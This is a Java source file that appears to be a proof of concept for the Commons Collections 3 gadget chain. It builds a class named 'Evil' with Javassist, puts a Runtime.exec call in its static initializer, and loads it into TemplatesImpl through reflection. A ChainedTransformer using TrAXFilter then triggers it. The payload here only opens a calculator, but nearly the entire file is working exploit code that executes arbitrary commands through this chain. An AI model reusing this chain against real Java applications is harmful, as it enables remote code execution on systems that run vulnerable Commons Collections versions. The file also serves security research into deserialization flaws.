package CommonsCollections3;

import java.io.*;
import java.lang.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import static org.apache.commons.collections.map.TransformedMap.*;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 10:33 下午
 */
public class TrAxFilterDemo {

    public static void trAxFilterDemo() throws IllegalAccessException, NoSuchFieldException, NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("Evil");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetByteCode = new byte[][]{shellCode};

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = templates.getClass();
        Field _name = c1.getDeclaredField("_name");
        Field _bytecode = c1.getDeclaredField("_bytecodes");
        Field _tfactory = c1.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetByteCode);
        _tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        outerMap.put("d1no", "web");
    }

    public static void main(String[] args) {
        try {
            trAxFilterDemo();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
